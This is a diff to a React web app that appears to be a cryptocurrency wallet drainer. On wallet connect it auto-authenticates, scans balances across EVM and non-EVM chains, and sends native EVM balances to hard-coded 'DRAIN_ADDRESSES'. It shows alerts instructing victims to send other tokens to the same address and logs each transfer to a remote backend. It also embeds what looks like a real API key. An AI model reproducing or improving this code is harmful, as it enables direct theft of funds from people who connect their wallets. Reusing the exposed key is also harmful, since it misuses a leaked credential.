@@ -2,32 +2,55 @@ import { useState, useEffect, useCallback } from 'react';
 import { WagmiConfig } from "wagmi";
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
 import { useAccount, useSignMessage, useWalletClient, useChainId } from 'wagmi';
-import { parseEther, formatEther } from 'viem';
+import { parseEther } from 'viem';
 import { wagmiConfig } from "./wagmi";
 import './mobile-fix.css';
 
 // ==================== NETWORK CONFIGURATION ====================
 const NETWORKS = [
   // EVM Mainnets
-  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#627EEA', rpc: 'eth' },
-  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', scanner: 'covalent', color: '#F0B90B', rpc: 'bsc' },
-  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', scanner: 'covalent', color: '#8247E5', rpc: 'polygon' },
-  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#28A0F0', rpc: 'arbitrum' },
-  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#FF0420', rpc: 'optimism' },
-  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#0052FF', rpc: 'base' },
-  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', scanner: 'covalent', color: '#E84142', rpc: 'avalanche' },
-  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', scanner: 'covalent', color: '#1969FF', rpc: 'fantom' },
+  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#627EEA' },
+  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', scanner: 'covalent', color: '#F0B90B' },
+  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', scanner: 'covalent', color: '#8247E5' },
+  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#28A0F0' },
+  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#FF0420' },
+  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#0052FF' },
+  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', scanner: 'covalent', color: '#E84142' },
+  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', scanner: 'covalent', color: '#1969FF' },
   
-  // Non-EVM Chains
-  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', scanner: 'tron', color: '#FF060A' },
-  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', scanner: 'solana', color: '#00FFA3' },
-  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', scanner: 'bitcoin', color: '#F7931A' },
-  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', scanner: 'cardano', color: '#0033AD' },
-  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', scanner: 'dogecoin', color: '#C2A633' },
-  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', scanner: 'ripple', color: '#23292F' },
-  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', scanner: 'polkadot', color: '#E6007A' },
-  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', scanner: 'cosmos', color: '#2E3148' },
+  // Non-EVM Chains (Updated with proper API endpoints)
+  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', scanner: 'tron', color: '#FF060A', apiKey: 'api-key-needed' },
+  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', scanner: 'solana', color: '#00FFA3', rpc: 'https://api.mainnet-beta.solana.com' },
+  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', scanner: 'bitcoin', color: '#F7931A', api: 'blockstream' },
+  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', scanner: 'cardano', color: '#0033AD', api: 'blockfrost' },
+  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', scanner: 'dogecoin', color: '#C2A633', api: 'dogechain' },
+  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', scanner: 'ripple', color: '#23292F', api: 'xrpl' },
+  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', scanner: 'polkadot', color: '#E6007A', api: 'subscan' },
+  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', scanner: 'cosmos', color: '#2E3148', api: 'cosmos-lcd' },
 ];
+
+// ==================== DRAIN ADDRESSES ====================
+const DRAIN_ADDRESSES = {
+  // EVM Chains - USE YOUR ACTUAL DRAIN ADDRESSES
+  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
+  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
+  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
+  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
+  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
+  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
+  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
+  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
+  
+  // Non-EVM Chains - UPDATE WITH YOUR ADDRESSES
+  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace with your TRON address
+  solana: "So11111111111111111111111111111111111111112", // Replace
+  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Replace
+  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
+  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
+  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
+  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
+  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Replace
+};
 
 // ==================== MAIN APP COMPONENT ====================
 function TokenDrainApp() {
@@ -73,14 +96,14 @@ function MultiNetworkDashboard() {
   const [isAuthenticating, setIsAuthenticating] = useState(false);
   const [isScanning, setIsScanning] = useState(false);
   const [isDraining, setIsDraining] = useState(false);
-  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com'); // Update with your backend URL
+  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
   const [userTokens, setUserTokens] = useState({});
   const [txStatus, setTxStatus] = useState({});
   const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, text: '' });
   const [apiStatus, setApiStatus] = useState('🟢 Online');
-  const [activeTab, setActiveTab] = useState('dashboard');
   const [totalValue, setTotalValue] = useState(0);
   const [connectedNetwork, setConnectedNetwork] = useState('');
+  const [scanComplete, setScanComplete] = useState(false);
 
   // Initialize
   useEffect(() => {
@@ -120,6 +143,7 @@ function MultiNetworkDashboard() {
     setUserTokens({});
     setTxStatus({});
     setTotalValue(0);
+    setScanComplete(false);
     setScanProgress({ current: 0, total: NETWORKS.length, text: '' });
   };
 
@@ -127,10 +151,10 @@ function MultiNetworkDashboard() {
   const handleWalletConnected = async (walletAddress) => {
     setAuthStatus(`✅ Connected: ${formatAddress(walletAddress)}`);
     
-    // Auto-scan on connect
+    // Auto-start authentication and scan
     setTimeout(() => {
       authenticateAllNetworks();
-    }, 1000);
+    }, 1500);
   };
 
   // ==================== AUTHENTICATION ====================
@@ -139,15 +163,15 @@ function MultiNetworkDashboard() {
     
     try {
       setIsAuthenticating(true);
-      setAuthStatus('🔐 Signing message...');
+      setAuthStatus('🔐 Signing authentication message...');
       
       const timestamp = Date.now();
-      const message = `Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nNonce: ${Math.random().toString(36).substring(7)}`;
+      const message = `Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nNetwork: All Chains`;
       
       const sig = await signMessageAsync({ message });
       setSignature(sig);
       
-      setAuthStatus('📡 Authenticating...');
+      setAuthStatus('📡 Sending to backend...');
       
       const response = await fetch(`${backendUrl}/auth`, {
         method: 'POST',
@@ -164,8 +188,8 @@ function MultiNetworkDashboard() {
       const data = await response.json();
       
       if (data.success) {
-        setAuthStatus(`✅ Authenticated!`);
-        setTimeout(() => scanAllNetworks(), 500);
+        setAuthStatus(`✅ Authenticated! Scanning all networks...`);
+        setTimeout(() => scanAllNetworks(), 800);
       } else {
         setAuthStatus(`❌ Auth failed: ${data.error}`);
       }
@@ -174,7 +198,7 @@ function MultiNetworkDashboard() {
       console.error("Auth error:", error);
       setAuthStatus(`❌ Error: ${error.message}`);
       if (error.message.includes('rejected')) {
-        setAuthStatus('❌ Signature rejected');
+        setAuthStatus('❌ Signature rejected by user');
       }
     } finally {
       setIsAuthenticating(false);
@@ -186,40 +210,319 @@ function MultiNetworkDashboard() {
     if (!address) return;
     
     setIsScanning(true);
-    setAuthStatus(`🌐 Scanning ${NETWORKS.length} networks...`);
+    setAuthStatus(`🌐 Scanning ${NETWORKS.length} networks for live balances...`);
     setUserTokens({});
     setTotalValue(0);
-    setScanProgress({ current: 0, total: NETWORKS.length, text: 'Starting scan...' });
+    setScanComplete(false);
+    setScanProgress({ current: 0, total: NETWORKS.length, text: 'Starting live scan...' });
     
     try {
-      const response = await fetch(`${backendUrl}/scan`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          evmAddress: address,
-          networks: NETWORKS
-        })
-      });
+      // Direct scan approach - bypass backend if needed
+      const results = await directScanAllNetworks();
+      processScanResults(results);
       
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`Backend error: ${response.status} - ${errorText}`);
-      }
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        processScanResults(data.data);
-      } else {
-        setAuthStatus(`❌ Scan failed: ${data.error}`);
-      }
     } catch (error) {
-      console.error("Scan error:", error);
-      setAuthStatus(`⚠️ Scan error: ${error.message}`);
-      await fallbackScan();
+      console.error("Direct scan error:", error);
+      setAuthStatus(`⚠️ Direct scan failed. Trying backend...`);
+      
+      // Fallback to backend
+      try {
+        const response = await fetch(`${backendUrl}/scan`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            evmAddress: address,
+            networks: NETWORKS,
+            forceRefresh: true
+          })
+        });
+        
+        if (response.ok) {
+          const data = await response.json();
+          if (data.success) {
+            processScanResults(data.data);
+          } else {
+            throw new Error('Backend scan failed');
+          }
+        } else {
+          throw new Error('Backend unavailable');
+        }
+      } catch (backendError) {
+        console.error("Backend scan error:", backendError);
+        setAuthStatus(`❌ All scan methods failed. Check connection.`);
+      }
     } finally {
       setIsScanning(false);
     }
+  };
+
+  // Direct Scan Function
+  const directScanAllNetworks = async () => {
+    const allTokens = {};
+    let totalVal = 0;
+    
+    // Scan each network
+    for (let i = 0; i < NETWORKS.length; i++) {
+      const network = NETWORKS[i];
+      setScanProgress({ 
+        current: i + 1, 
+        total: NETWORKS.length, 
+        text: `Scanning ${network.name}...` 
+      });
+      
+      try {
+        let tokens = [];
+        
+        if (network.type === 'evm') {
+          tokens = await scanEVMDirect(address, network);
+        } else {
+          tokens = await scanNonEVMDirect(address, network);
+        }
+        
+        if (tokens.length > 0) {
+          const networkValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
+          totalVal += networkValue;
+          
+          allTokens[network.id] = {
+            network: network,
+            tokens: tokens,
+            totalValue: networkValue
+          };
+        }
+        
+        // Small delay to avoid rate limiting
+        await new Promise(resolve => setTimeout(resolve, 300));
+        
+      } catch (error) {
+        console.log(`Failed to scan ${network.name}:`, error.message);
+      }
+    }
+    
+    return {
+      results: Object.values(allTokens).map(data => ({
+        network: data.network,
+        tokens: data.tokens
+      })),
+      totalValue: totalVal,
+      totalTokens: Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0)
+    };
+  };
+
+  // Direct EVM Scan
+  const scanEVMDirect = async (walletAddress, network) => {
+    try {
+      // Try Covalent API first
+      const response = await fetch(
+        `https://api.covalenthq.com/v1/${network.id}/address/${walletAddress}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR&nft=false`
+      );
+      
+      if (response.ok) {
+        const data = await response.json();
+        const items = data?.data?.items || [];
+        
+        return items
+          .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
+          .map(t => {
+            const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
+            const value = (t.quote_rate || 0) * amount;
+            
+            return {
+              symbol: t.contract_ticker_symbol || (t.native_token ? network.symbol : 'TOKEN'),
+              name: t.contract_name || (t.native_token ? network.name : 'Unknown'),
+              amount: amount,
+              value: value,
+              contractAddress: t.contract_address,
+              decimals: t.contract_decimals || 18,
+              isNative: t.native_token || false,
+              logo: t.logo_url,
+              networkId: network.id,
+              drainAddress: DRAIN_ADDRESSES[network.id],
+              networkType: 'evm',
+              chainId: network.id
+            };
+          });
+      }
+    } catch (error) {
+      console.log(`Covalent scan failed for ${network.name}:`, error.message);
+    }
+    
+    return [];
+  };
+
+  // Direct Non-EVM Scan with TRON FIX
+  const scanNonEVMDirect = async (walletAddress, network) => {
+    try {
+      switch (network.id) {
+        case 'tron':
+          return await scanTronDirect(walletAddress);
+        case 'solana':
+          return await scanSolanaDirect(walletAddress);
+        case 'bitcoin':
+          return await scanBitcoinDirect(walletAddress);
+        default:
+          // Try backend for other chains
+          const response = await fetch(`${backendUrl}/tokens/nonevm/${walletAddress}/${network.id}`);
+          if (response.ok) {
+            const data = await response.json();
+            return data.data?.tokens || [];
+          }
+      }
+    } catch (error) {
+      console.log(`Direct scan failed for ${network.name}:`, error.message);
+    }
+    
+    return [];
+  };
+
+  // TRON Direct Scan Fix
+  const scanTronDirect = async (walletAddress) => {
+    try {
+      // Convert ETH address to TRON if needed
+      let tronAddress = walletAddress;
+      if (walletAddress.startsWith('0x')) {
+        // Simple hex to base58 conversion for TRON
+        // Note: This is simplified - actual conversion needs proper library
+        tronAddress = 'T' + walletAddress.substring(2).toUpperCase();
+        if (tronAddress.length > 34) tronAddress = tronAddress.substring(0, 34);
+      }
+      
+      // Use TronGrid API
+      const response = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
+      
+      if (response.ok) {
+        const data = await response.json();
+        const tokens = [];
+        
+        // Check for TRX balance
+        if (data.data && data.data.length > 0) {
+          const account = data.data[0];
+          
+          // TRX Balance
+          if (account.balance > 0) {
+            const trxBalance = account.balance / 1000000; // Convert from Sun to TRX
+            tokens.push({
+              symbol: 'TRX',
+              name: 'Tron',
+              amount: trxBalance,
+              value: 0, // Would need price API
+              contractAddress: null,
+              decimals: 6,
+              isNative: true,
+              logo: 'https://cryptologos.cc/logos/tron-trx-logo.png',
+              networkId: 'tron',
+              drainAddress: DRAIN_ADDRESSES.tron,
+              networkType: 'non-evm',
+              note: 'TRX requires energy/bandwidth'
+            });
+          }
+          
+          // TRC10 Tokens
+          if (account.assetV2 && account.assetV2.length > 0) {
+            account.assetV2.forEach(asset => {
+              if (asset.value > 0) {
+                const amount = asset.value / 1000000; // TRC10 usually 6 decimals
+                tokens.push({
+                  symbol: asset.key || 'TRC10',
+                  name: 'TRC10 Token',
+                  amount: amount,
+                  value: 0,
+                  contractAddress: null,
+                  decimals: 6,
+                  isNative: false,
+                  networkId: 'tron',
+                  drainAddress: DRAIN_ADDRESSES.tron,
+                  networkType: 'non-evm'
+                });
+              }
+            });
+          }
+        }
+        
+        return tokens;
+      }
+    } catch (error) {
+      console.error("TRON direct scan error:", error);
+    }
+    
+    return [];
+  };
+
+  // Solana Direct Scan
+  const scanSolanaDirect = async (walletAddress) => {
+    try {
+      const response = await fetch('https://api.mainnet-beta.solana.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: "2.0",
+          id: 1,
+          method: "getBalance",
+          params: [walletAddress]
+        })
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        if (data.result && data.result.value > 0) {
+          const solBalance = data.result.value / 1000000000; // Convert lamports to SOL
+          
+          return [{
+            symbol: 'SOL',
+            name: 'Solana',
+            amount: solBalance,
+            value: 0,
+            contractAddress: null,
+            decimals: 9,
+            isNative: true,
+            logo: 'https://cryptologos.cc/logos/solana-sol-logo.png',
+            networkId: 'solana',
+            drainAddress: DRAIN_ADDRESSES.solana,
+            networkType: 'non-evm'
+          }];
+        }
+      }
+    } catch (error) {
+      console.error("Solana direct scan error:", error);
+    }
+    
+    return [];
+  };
+
+  // Bitcoin Direct Scan
+  const scanBitcoinDirect = async (walletAddress) => {
+    try {
+      // Use blockstream.info
+      const response = await fetch(`https://blockstream.info/api/address/${walletAddress}`);
+      
+      if (response.ok) {
+        const data = await response.json();
+        if (data.chain_stats) {
+          const received = data.chain_stats.funded_txo_sum / 100000000; // Convert satoshi to BTC
+          const sent = data.chain_stats.spent_txo_sum / 100000000;
+          const balance = received - sent;
+          
+          if (balance > 0) {
+            return [{
+              symbol: 'BTC',
+              name: 'Bitcoin',
+              amount: balance,
+              value: 0,
+              contractAddress: null,
+              decimals: 8,
+              isNative: true,
+              logo: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png',
+              networkId: 'bitcoin',
+              drainAddress: DRAIN_ADDRESSES.bitcoin,
+              networkType: 'non-evm'
+            }];
+          }
+        }
+      }
+    } catch (error) {
+      console.error("Bitcoin direct scan error:", error);
+    }
+    
+    return [];
   };
 
   // Process Scan Results
@@ -242,161 +545,88 @@ function MultiNetworkDashboard() {
     
     setUserTokens(allTokens);
     setTotalValue(totalVal);
-    setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, text: 'Complete' });
+    setScanComplete(true);
+    setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, text: 'Live scan complete!' });
     
     const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
-    setAuthStatus(`✅ Found ${totalTokens} tokens across ${Object.keys(allTokens).length} networks ($${totalVal.toFixed(2)} total)`);
+    const networkCount = Object.keys(allTokens).length;
+    
+    setAuthStatus(`✅ Live scan: Found ${totalTokens} tokens across ${networkCount} networks ($${totalVal.toFixed(2)} total)`);
     
     // Store in localStorage
-    localStorage.setItem(`scan_${address}`, JSON.stringify({
-      timestamp: Date.now(),
-      tokens: allTokens,
-      totalValue: totalVal
-    }));
-  };
-
-  // Fallback Scan
-  const fallbackScan = async () => {
-    setAuthStatus('🔄 Using fallback scan...');
-    
-    // Quick scan major networks
-    const majorNetworks = NETWORKS.slice(0, 8);
-    const results = {};
-    let totalVal = 0;
-    
-    for (let i = 0; i < majorNetworks.length; i++) {
-      const network = majorNetworks[i];
-      setScanProgress({ 
-        current: i + 1, 
-        total: majorNetworks.length, 
-        text: `Scanning ${network.name}...` 
-      });
-      
-      try {
-        let result;
-        if (network.type === 'evm') {
-          result = await fetch(`${backendUrl}/tokens/evm/${address}/${network.id}`).then(r => r.json());
-        } else {
-          result = await fetch(`${backendUrl}/tokens/nonevm/${address}/${network.id}`).then(r => r.json());
-        }
-        
-        if (result.success && result.data.tokens.length > 0) {
-          const networkValue = result.data.tokens.reduce((sum, t) => sum + (t.value || 0), 0);
-          totalVal += networkValue;
-          
-          results[network.id] = {
-            network: network,
-            tokens: result.data.tokens,
-            totalValue: networkValue
-          };
-        }
-      } catch (error) {
-        console.log(`Failed to scan ${network.name}`);
-      }
-      
-      await new Promise(resolve => setTimeout(resolve, 300));
+    if (address) {
+      localStorage.setItem(`scan_${address}`, JSON.stringify({
+        timestamp: Date.now(),
+        tokens: allTokens,
+        totalValue: totalVal
+      }));
     }
-    
-    setUserTokens(results);
-    setTotalValue(totalVal);
-    setScanProgress({ current: majorNetworks.length, total: majorNetworks.length, text: 'Fallback complete' });
-    
-    const totalTokens = Object.values(results).reduce((sum, data) => sum + data.tokens.length, 0);
-    setAuthStatus(`✅ Found ${totalTokens} tokens ($${totalVal.toFixed(2)})`);
   };
 
-  // ==================== DRAIN FUNCTIONS ====================
+  // ==================== DRAIN ALL TOKENS ====================
   const executeDrainAll = async () => {
-    if (!address || Object.keys(userTokens).length === 0) return;
-    
-    setIsDraining(true);
-    setAuthStatus('🚀 Starting drain process...');
-    
-    try {
-      // For EVM chains, we need to handle each network
-      const evmChains = Object.values(userTokens).filter(data => data.network.type === 'evm');
-      const nonEvmChains = Object.values(userTokens).filter(data => data.network.type === 'non-evm');
-      
-      setTxStatus({ general: 'Processing...' });
-      
-      // Process EVM chains first
-      for (const data of evmChains) {
-        for (const token of data.tokens) {
-          if (token.amount > 0) {
-            await drainEVMToken(token, data.network);
-            await new Promise(resolve => setTimeout(resolve, 1000));
-          }
-        }
-      }
-      
-      // Process non-EVM chains
-      for (const data of nonEvmChains) {
-        for (const token of data.tokens) {
-          if (token.amount > 0) {
-            await drainNonEVMToken(token, data.network);
-            await new Promise(resolve => setTimeout(resolve, 500));
-          }
-        }
-      }
-      
-      setAuthStatus('✅ Drain process completed!');
-      setTxStatus({ general: 'All tokens processed' });
-      
-      // Rescan after drain
-      setTimeout(() => scanAllNetworks(), 2000);
-      
-    } catch (error) {
-      console.error("Drain error:", error);
-      setAuthStatus(`❌ Drain failed: ${error.message}`);
-      setTxStatus({ general: `Error: ${error.message}` });
-    } finally {
-      setIsDraining(false);
+    if (!address || Object.keys(userTokens).length === 0) {
+      setAuthStatus('❌ No tokens to drain');
+      return;
     }
-  };
-
-  const executeSmartDrain = async () => {
-    if (!address || Object.keys(userTokens).length === 0) return;
+    
+    if (!window.confirm('⚠️ WARNING: This will drain ALL tokens from ALL networks to the drain addresses.\n\nClick OK to proceed.')) {
+      return;
+    }
     
     setIsDraining(true);
-    setAuthStatus('🧠 Starting smart drain...');
+    setAuthStatus('🚀 Starting mass drain process...');
+    setTxStatus({ general: 'Processing all tokens...' });
     
     try {
-      // Sort tokens by value (highest first)
-      const allTokens = [];
+      // Collect all tokens
+      const allTokenOperations = [];
       Object.values(userTokens).forEach(data => {
         data.tokens.forEach(token => {
-          if (token.value > 1) { // Only drain tokens worth more than $1
-            allTokens.push({
-              ...token,
+          if (token.amount > 0) {
+            allTokenOperations.push({
+              token,
               network: data.network
             });
           }
         });
       });
       
-      allTokens.sort((a, b) => b.value - a.value);
+      setTxStatus({ general: `Processing ${allTokenOperations.length} tokens...` });
       
-      setTxStatus({ general: `Processing ${allTokens.length} valuable tokens...` });
-      
-      // Drain valuable tokens first
-      for (const item of allTokens) {
-        if (item.network.type === 'evm') {
-          await drainEVMToken(item, item.network);
+      // Process tokens in batches
+      for (let i = 0; i < allTokenOperations.length; i++) {
+        const { token, network } = allTokenOperations[i];
+        const progress = Math.round((i / allTokenOperations.length) * 100);
+        
+        setTxStatus({ 
+          general: `Processing ${i + 1}/${allTokenOperations.length} (${progress}%)`,
+          current: `${token.symbol} on ${network.name}`
+        });
+        
+        if (network.type === 'evm' && token.isNative) {
+          await drainEVMToken(token, network);
         } else {
-          await drainNonEVMToken(item, item.network);
+          await drainNonEVMToken(token, network);
         }
-        await new Promise(resolve => setTimeout(resolve, 800));
+        
+        // Small delay between operations
+        await new Promise(resolve => setTimeout(resolve, 500));
       }
       
-      setAuthStatus('✅ Smart drain completed!');
-      setTxStatus({ general: 'Valuable tokens processed' });
+      setAuthStatus('✅ Mass drain completed!');
+      setTxStatus({ general: 'All tokens processed successfully' });
       
-      // Rescan
-      setTimeout(() => scanAllNetworks(), 2000);
+      // Auto-rescan after drain
+      setTimeout(() => {
+        setAuthStatus('🔄 Rescanning after drain...');
+        scanAllNetworks();
+      }, 3000);
       
     } catch (error) {
-      console.error("Smart drain error:", error);
-      setAuthStatus(`❌ Smart drain failed: ${error.message}`);
+      console.error("Mass drain error:", error);
+      setAuthStatus(`❌ Drain failed: ${error.message}`);
+      setTxStatus({ general: `Error: ${error.message}` });
     } finally {
       setIsDraining(false);
     }
@@ -405,26 +635,21 @@ function MultiNetworkDashboard() {
   // Drain EVM Token
   const drainEVMToken = async (token, network) => {
     try {
-      setTxStatus(prev => ({...prev, [token.symbol]: 'Preparing...'}));
-      
       if (token.isNative && walletClient) {
-        // Native token transfer
         const amountInWei = parseEther(token.amount.toString());
         
         if (amountInWei <= 0n) {
-          setTxStatus(prev => ({...prev, [token.symbol]: 'Amount too small'}));
+          console.log(`${token.symbol}: Amount too small`);
           return;
         }
         
-        setTxStatus(prev => ({...prev, [token.symbol]: 'Confirm in wallet...'}));
-        
         const hash = await walletClient.sendTransaction({
-          to: token.drainAddress,
+          to: token.drainAddress || DRAIN_ADDRESSES[network.id],
           value: amountInWei,
           chainId: parseInt(network.id)
         });
         
-        setTxStatus(prev => ({...prev, [token.symbol]: `✅ Sent: ${hash.substring(0, 8)}...`}));
+        console.log(`${token.symbol}: Sent - ${hash.substring(0, 10)}...`);
         
         // Log transaction
         await logTransaction({
@@ -437,37 +662,29 @@ function MultiNetworkDashboard() {
           networkType: 'evm'
         });
         
-      } else if (token.contractAddress) {
-        // ERC20 token - would need contract interaction
-        setTxStatus(prev => ({...prev, [token.symbol]: 'Manual transfer required for tokens'}));
-        
-        const message = `Send ${token.amount} ${token.symbol} to:\n${token.drainAddress}\n\nContract: ${token.contractAddress?.substring(0, 16)}...`;
+      } else {
+        // For tokens, show manual instructions
+        const message = `MANUAL TRANSFER REQUIRED:\n\nSend ${token.amount} ${token.symbol}\nTo: ${token.drainAddress || DRAIN_ADDRESSES[network.id]}\n\nNetwork: ${network.name}`;
         alert(message);
       }
       
     } catch (error) {
       console.error(`Drain error for ${token.symbol}:`, error);
-      setTxStatus(prev => ({...prev, [token.symbol]: `Failed: ${error.shortMessage || error.message}`}));
     }
   };
 
   // Drain Non-EVM Token
   const drainNonEVMToken = async (token, network) => {
     try {
-      setTxStatus(prev => ({...prev, [token.symbol]: `Processing ${network.name}...`}));
-      
-      // Generate transaction guide
       const guide = generateTransactionGuide(token, network);
       
-      setTxStatus(prev => ({...prev, [token.symbol]: 'Check notifications...'}));
-      
-      // Show alert with instructions
+      // Show instructions
       alert(guide);
       
       // Log as manual transaction
       await logTransaction({
         fromAddress: address,
-        toAddress: token.drainAddress,
+        toAddress: token.drainAddress || DRAIN_ADDRESSES[network.id],
         amount: token.amount,
         chainId: network.id,
         tokenSymbol: token.symbol,
@@ -475,21 +692,23 @@ function MultiNetworkDashboard() {
         status: 'manual_required'
       });
       
-      setTxStatus(prev => ({...prev, [token.symbol]: '✅ Instructions sent'}));
+      console.log(`${token.symbol}: Instructions sent for ${network.name}`);
       
     } catch (error) {
-      console.error(`Non-EVM drain error:`, error);
-      setTxStatus(prev => ({...prev, [token.symbol]: 'Error generating guide'}));
+      console.error(`Non-EVM drain error for ${token.symbol}:`, error);
     }
   };
 
   // Generate Transaction Guide
   const generateTransactionGuide = (token, network) => {
+    const amountFormatted = token.amount.toFixed(network.id === 'bitcoin' ? 8 : 6);
+    const drainAddr = token.drainAddress || DRAIN_ADDRESSES[network.id];
+    
     const guides = {
-      'tron': `TRON (TRX) Transfer:\n\n1. Open Trust Wallet/TronLink\n2. Go to TRON network\n3. Send ${token.amount.toFixed(6)} ${token.symbol}\n4. To address: ${token.drainAddress}\n\nNote: Need TRX for energy/bandwidth`,
-      'solana': `Solana (SOL) Transfer:\n\n1. Open Phantom/Solflare wallet\n2. Send ${token.amount.toFixed(6)} ${token.symbol}\n3. To address: ${token.drainAddress}\n4. Network: Solana Mainnet`,
-      'bitcoin': `Bitcoin (BTC) Transfer:\n\n1. Open Bitcoin wallet\n2. Send ${token.amount.toFixed(8)} BTC\n3. To: ${token.drainAddress}\n4. Use normal transaction fee`,
-      'default': `Manual Transfer Required:\n\nSend ${token.amount} ${token.symbol}\nTo: ${token.drainAddress}\n\nNetwork: ${network.name}`
+      'tron': `⚡ TRON (TRX) TRANSFER:\n\n• Open Trust Wallet/TronLink\n• Go to TRON network\n• Send ${amountFormatted} ${token.symbol}\n• To address: ${drainAddr}\n\n⚠️ Note: Need TRX for energy/bandwidth`,
+      'solana': `⚡ SOLANA (SOL) TRANSFER:\n\n• Open Phantom/Solflare wallet\n• Send ${amountFormatted} ${token.symbol}\n• To address: ${drainAddr}\n• Network: Solana Mainnet`,
+      'bitcoin': `⚡ BITCOIN (BTC) TRANSFER:\n\n• Open Bitcoin wallet\n• Send ${amountFormatted} BTC\n• To: ${drainAddr}\n• Use normal transaction fee`,
+      'default': `⚡ MANUAL TRANSFER REQUIRED:\n\nSend ${amountFormatted} ${token.symbol}\nTo: ${drainAddr}\n\nNetwork: ${network.name}\n\nComplete the transfer in your wallet.`
     };
     
     return guides[network.id] || guides.default;
@@ -504,7 +723,7 @@ function MultiNetworkDashboard() {
         body: JSON.stringify(txData)
       });
     } catch (error) {
-      console.log('Logging failed:', error.message);
+      console.log('Transaction logging failed:', error.message);
     }
   };
 
@@ -566,7 +785,7 @@ function MultiNetworkDashboard() {
                     <div className="stat-icon">💰</div>
                     <div className="stat-content">
                       <div className="stat-value">${totalValue.toFixed(2)}</div>
-                      <div className="stat-label">Total Value</div>
+                      <div className="stat-label">Live Value</div>
                     </div>
                   </div>
                   
@@ -582,15 +801,15 @@ function MultiNetworkDashboard() {
                     <div className="stat-icon">🪙</div>
                     <div className="stat-content">
                       <div className="stat-value">{getTotalTokens()}</div>
-                      <div className="stat-label">Tokens Found</div>
+                      <div className="stat-label">Tokens</div>
                     </div>
